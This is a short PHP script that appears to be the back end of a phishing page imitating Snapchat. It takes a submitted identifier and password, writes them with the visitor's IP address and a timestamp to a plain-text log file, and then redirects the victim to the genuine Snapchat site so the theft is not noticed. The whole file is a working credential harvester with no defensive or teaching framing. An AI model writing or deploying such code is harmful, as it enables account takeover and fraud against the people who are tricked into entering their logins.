<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $identifier = $_POST['identifier'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');

    $log = fopen('log.txt', 'a');
    fwrite($log, "$time | $ip | $identifier | $password\n");
    fclose($log);

    header('Location: https://www.snapchat.com/');
    exit;
}
?>